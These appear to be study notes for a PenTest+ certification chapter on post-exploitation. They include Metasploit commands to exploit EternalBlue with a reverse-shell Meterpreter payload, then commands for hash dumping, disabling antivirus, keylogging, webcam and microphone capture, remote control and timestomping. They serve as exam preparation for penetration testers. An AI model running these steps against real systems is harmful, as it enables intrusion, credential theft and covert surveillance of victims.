# CompTIA® PenTest+® Certification For Dummies®, 2nd Edition

# Chapter 8: Understanding Post Exploitation Actions

Actions after bypassing security of system:
- Gaining Access to passwords that can access to other systems on network
- Planting backdoor so if system is patched, there will still be a way into system later on.

Learn:
- Common post exploitation tasks
- Obtain shell
- Retrieve password hashes
- Disable Antivirus software
- Take Screenshots
- Take remote control of the system on network
- How to maintain access (persistence).
- How to cover your tracks when finished.

#

## Common Post Exploitation Tasks

Common Post Exploitation Tasks
- Meterpreter session in Metasploit.
- Meterprete = Metaspolit payload (type of attack) that gives you interactive command prompt
  - Containing number of built in modules (commands) for execution on target system aiding in post exploitation.
 
Vuln in SMB protocol (EternalBlue)
- `msfconsole`: open up metasploit.
- `search ms17-010`: search EternalBlue in metasploit.

![image](https://github.com/user-attachments/assets/2e8f233e-d32d-436e-8de8-480656f6692f)

- `use exploit/windows/smb/ms17_010_eternalblue`
-  `set payload windows/x64/meterpreter/reverse_tcp`
-  `set RHOST <victim_ip>`
-  `set LHOST <kali_ip>`
-  `exploit`

![image](https://github.com/user-attachments/assets/43304077-f3ae-4db3-9bc0-325284193214)

- Once system has been exploited you will see meterpreter prompt.

Commands broken down by category:
- Core Commands: Standard commands available with meterpreter; allow to perform number of tacks: background the current session, exit, get help, and migrate.
- File System Commands: Allow you to work with folders and files (Example: dir, cat, upload, and edit).
- Network Commands: Give details on your network setup and environment. Commands includes `ifconfig`. `ipconfig`, `netstat`, `route`.
- System Commands: Works with target system. Example: Can view running processes with `ps` or kill a process with `kill` command.
- User-interface commands: Works with user interface environment with command such as `keyscan_start`, `screenshot` and `idletime`.
- Webcam Commands: manipulate webcam of compromised system by turning it on or off. Can use command such as `webcam_list`, `record_mic`, `webcam_snap` or `webcam_stream`.
- Elevate Commands: `getsystem` command elevates your privileges to system-level privileges.
- Password Database Commands: Can retrieve list of password hashes from system by using the `hashdump` command.
- Timestomp Commands: Can manipulate file MACE (modifies, access, created, entry) attributes with `timestomp` command.


Understanding the Context
- Important commands: `sysinfo`, `getuid` `getpid` `pwd`
- `sysinfo`: display system information; computer you are currently on and its OS information.
- `getuid`: display user account you are connected as.
- `getpid`: display process you are connected to as your running context.
- `pwd`: display current directory you are in on victim's system.

![image](https://github.com/user-attachments/assets/817d6491-bf46-4a91-917d-c3f6ceeb9166)


Collecting Information/ Enumeration
- Users: Retrieving list of usernames from system could aid in gaining access to restricted areas on system or access to othe systems.
- Groups: Getting list of groups can help you determine if you need to add yourself to specific group in order to bypass access crontrol lists at later time.
- Forests: Getting a list of Active Directory forests that exist can be helpful to locate other resources on network.
- Sensitive Data: User account information or company sensitive data.
- Unencrypted files: Look thru unencrypted files to find info of value.


Commands:
- `run checkvm`: check to see if system is a VM and platform its using.
- `run winenum`: run a script to enumerate entire system and find info such as IP settings, ither systems on network in the same domain arp cache of system, user acc on system.
  - Output is saved: `/root/.msf4/logs/scripts` folder.

![image](https://github.com/user-attachments/assets/35e7189c-a704-4b0f-8ec5-9dceecf8f6df)

![image](https://github.com/user-attachments/assets/9c2e7044-8958-402f-9d35-16d64d8f1c97)

- `run scraper`: Another enumeration tool that does the same thing and store the results into log files.


Obtaining Shell
- First thing to do after exploiting a system is: get Command prompt shell of that system so anything can be use on OS  I want to use.
- `shell`, get a command prompt of exploited system.
- After running `shell`, you will have the command prompt of target system available.
- When you are finished execturing OS commands, use `exit` command to go back to meterpreter prompt.

![image](https://github.com/user-attachments/assets/fa31b109-305a-494f-95b4-a89af6fe5fc9)


Retrieving Password Hashes
- `hashdump`: to retrieve password hashes of user accounts that exist on victim's system.
- After retrieving hash values, you can use those in the pass-the-hash type of attack
- Can also use password crackers and try to crack the password.

![image](https://github.com/user-attachments/assets/02890fd2-ec65-4f4a-89fa-0815b6787cea)

Disabling the Antivirus Software
- You can plant virus as a backdoor to the system by disabling antivirus.
- `run killav`: run this on meterpreter to disable antivirus software.


Migrating to Different Process
- Jumping from current process you exploited to another process that is more stable; explorer.exe or Other OS process thats running at all times.
- First command to run in this scenerio is `getpid`, in order to view the current process.
- `ps`: See the list of processes running on victim's system.
- `mirgate <desired_process_id>`: command tries to switch to another process.

![image](https://github.com/user-attachments/assets/cb31dc7e-a3b2-4c93-9f31-785f2e3289e0)


Privilege Escalation and Restrictive Shells
- Privilege Escalation: when attacker exploit a vuln within system/software on system and gain elevated permission to resources that they won't normally have.
- Two types of Privilege Escalation

![image](https://github.com/user-attachments/assets/5340f917-9111-478a-bd61-08bbfff58e4e)

- Restrictive Shell: Your actions are restricted due to limitation put on the shell environment.
  - After gaining access to a system; you can upgrade a restricted shell to a non-restricted shell.
  - by executing commands to obtain an interactive shell or by exexuting command thru another programming environment supported by system (Python or Ruby).
 

Taking Screenshots
- `screenshot`: command to take screenshot of victim's screen to see what program victim is using.
  - JPEG file saved to /root/directory with random filename
 

Taking Remote Control
- Can watch victim's computer by using Virutal Network Computing (VNC).
- `run vnc`: to establish VNC connection to system at meterpreter prompt.

![image](https://github.com/user-attachments/assets/6be4cd82-d348-4d6d-920a-eaac2aff99b4)


Capturing Keystrokes
- Great way to get logon activity to app and websites is to capture all user's keystrokes.
- Need to migrate to "explorer.exe".
- `ps`: to see what explorer.exe ID (2780)
- `migrate 2780`: to change to explorere process.
- Once migrated; `keycan_start`: to capture keystrokes a user types.
  - Run a bit, can dump the keystokes to your screen with: `keyscan_dump`.
  - `keyscan_stop` to stop recording keystrokes at any time.

![image](https://github.com/user-attachments/assets/92ad5da4-4b13-43b3-bc1f-11b9b47a36e7)


Enabling the Webcam
- `webcam_list`: to get list of webcams on victim's system. Each webcam would have an index number associated with it starting with 1.
- `webcam_snap`: Take photo from one of the webcams, `webcam_snap -i 1`; where 1 is index of webcam 1.
- `webcam_stream`: Activate live video stream, `webcam_stream -i 1`; Meterpreter will launch browser that contain live stream video embedded in webpage.

Enable Microphone/ Record
- `record_mic -d 45`: record the conversation of people sitting at the computer for 45 seconds. .wav files.


Network Segmentation Testing
- Checking different network segments after exploiting a system.
- Test: If you can use Nmap to see if you can communicate from segment to network segment, where communication is supposedly not permitted.
- Test: Communication from Internet into network's demilitarized zone (DMZ) to see if traffic can go from DMZ to private network segment.

#

## Performing Lateral Movement




#

## For The Exam

- Empire: PowerShell post-exploitation toolset that is similar in concept to Metaspolit as it has a number of modules to perform different tasks; Keyloggers and Mimikatz.
- Mimikatz: Tool used to see other use accounts on system and obtain their password hashes. Unique; can obtain credentials that are still running in memory.
- Bloodhound: Tool used to view relationship between active directory objects in graphical environment.
  - Example: Can identify how many accounts are domain admin account.
 

